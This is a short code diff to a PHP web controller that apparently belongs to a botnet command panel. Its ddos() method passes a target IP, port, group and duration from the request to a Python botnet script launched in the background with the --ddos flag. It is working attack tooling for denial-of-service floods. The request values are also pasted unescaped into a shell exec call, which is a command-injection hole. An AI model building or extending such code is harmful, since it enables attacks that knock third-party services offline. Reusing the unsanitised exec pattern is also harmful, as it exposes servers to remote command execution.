@@ -163,12 +163,14 @@ class NetworkController extends Controller
 
     public function ddos(Request $request)
     {
+        $path = env('PATH_PYTHON_EXECUTABLE');
         $group_id = $request->group_id;
         $group_name = $request->group_name;
         $ip_address = $request->ip_address;
+        $port = $request->port;
         $duration = $request->duration;
 
-        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --ddos --group $group_name --address $ip_address --time $duration > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --ddos --group ".$group_name." --address ".$ip_address." --port ".$port." --time ".$duration." > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
 
         $pid = $output[0];
